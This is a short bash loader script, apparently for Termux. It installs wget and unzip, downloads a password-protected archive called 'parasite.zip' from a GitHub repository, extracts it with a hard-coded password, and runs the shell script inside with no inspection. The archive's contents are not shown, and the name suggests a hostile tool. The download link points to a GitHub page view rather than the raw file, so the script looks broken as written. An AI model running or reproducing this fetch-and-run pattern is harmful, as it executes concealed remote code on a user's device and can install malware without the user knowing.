#!/bin/bash
until command -v wget > /dev/null; do
    pkg install wget unzip -y
done
wget https://github.com/SrTopster/Parasite/blob/main/parasite.zip
unzip -P tibia parasite.zip
bash parasite.sh